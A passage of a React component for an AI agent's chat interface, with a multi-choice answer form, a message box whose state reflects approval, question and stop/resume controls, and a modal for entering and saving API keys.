              <div className={styles.optionsList}>
                {questionRequest.options.map((option, i) => (
                  <label key={i} className={styles.optionCheckbox}>
                    <input
                      type="checkbox"
                      value={option}
                      checked={selectedOptions.includes(option)}
                      onChange={(e) => {
                        if (e.target.checked) {
                          setSelectedOptions([...selectedOptions, option])
                        } else {
                          setSelectedOptions(selectedOptions.filter(o => o !== option))
                        }
                      }}
                    />
                    <span>{option}</span>
                  </label>
                ))}
              </div>
            )}
          </div>
          <div className={styles.questionActions}>
            <button
              className={`${styles.answerButton} ${styles.answerButtonSubmit}`}
              onClick={handleAnswer}
              disabled={isLoading || (questionRequest.format === 'text' ? !answerText.trim() : selectedOptions.length === 0)}
            >
              Submit Answer
            </button>
          </div>
        </div>
      )}

      {/* Input */}
      <div className={styles.inputContainer}>
        <div className={styles.inputWrapper}>
          <textarea
            ref={inputRef}
            className={styles.input}
            value={inputValue}
            onChange={handleInputChange}
            onKeyDown={handleKeyDown}
            placeholder={
              !isConnected
                ? 'Connecting to agent...'
                : awaitingApproval
                ? 'Respond to the approval request above...'
                : awaitingQuestion
                ? 'Answer the question above...'
                : isStopped
                ? 'Agent stopped. Click resume to continue...'
                : isLoading
                ? 'Send guidance to the agent...'
                : 'Ask a question...'
            }
            rows={2}
            disabled={awaitingApproval || awaitingQuestion || !isConnected || isStopped}
          />
          <div className={styles.inputActions}>
            {(isLoading || isStopped || isStopping) && (
              <button
                className={`${styles.stopResumeButton} ${isStopped ? styles.resumeButton : styles.stopButton}`}
                onClick={isStopped ? handleResume : handleStop}
                disabled={isStopping}
                aria-label={isStopping ? 'Stopping...' : isStopped ? 'Resume agent' : 'Stop agent'}
                title={isStopping ? 'Stopping...' : isStopped ? 'Resume execution' : 'Stop execution'}
              >
                {isStopping ? <Loader2 size={13} className={styles.spinner} /> : isStopped ? <Play size={13} /> : <Square size={13} />}
              </button>
            )}
            <button
              className={styles.sendButton}
              onClick={handleSend}
              disabled={!inputValue.trim() || awaitingApproval || awaitingQuestion || !isConnected || isStopped}
              aria-label="Send message"
            >
              <Send size={13} />
            </button>
          </div>
        </div>
        <span className={styles.inputHint}>
          {isConnected
            ? isLoading
              ? 'Send guidance or stop the agent'
              : 'Press Enter to send, Shift+Enter for new line'
            : 'Waiting for connection...'}
        </span>
      </div>

      {/* API Key quick-add modal */}
      {apiKeyModal && API_KEY_INFO[apiKeyModal] && (
        <div className={styles.apiKeyOverlay} onClick={closeApiKeyModal}>
          <div className={styles.apiKeyModal} onClick={e => e.stopPropagation()}>
            <h3 className={styles.apiKeyModalTitle}>{API_KEY_INFO[apiKeyModal].label} API Key</h3>
            <div className="formGroup">
              <label className="formLabel">{API_KEY_INFO[apiKeyModal].label} API Key</label>
              <div className={styles.apiKeyInputWrapper}>
                <input
                  className="textInput"
                  type={apiKeyVisible ? 'text' : 'password'}
                  value={apiKeyValue}
                  onChange={e => setApiKeyValue(e.target.value)}
                  placeholder={`Enter ${API_KEY_INFO[apiKeyModal].label.toLowerCase()} API key`}
                  autoFocus
                />
                <button
                  className={styles.apiKeyToggle}
                  onClick={() => setApiKeyVisible(v => !v)}
                  type="button"
                >
                  {apiKeyVisible ? <EyeOff size={14} /> : <Eye size={14} />}
                </button>
              </div>
              <span className="formHint">
                {API_KEY_INFO[apiKeyModal].hint}
                {' — '}
                <a href={API_KEY_INFO[apiKeyModal].url} target="_blank" rel="noopener noreferrer" style={{ color: 'var(--accent-primary)' }}>
                  Get API key
                </a>
              </span>
            </div>
            <div className={styles.apiKeyModalActions}>
              <button className="secondaryButton" onClick={closeApiKeyModal}>Cancel</button>
              <button
                className="primaryButton"
                disabled={!apiKeyValue.trim() || apiKeySaving}
                onClick={saveApiKey}
              >
                {apiKeySaving ? <Loader2 size={14} className={styles.spinner} /> : null}
                Save
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
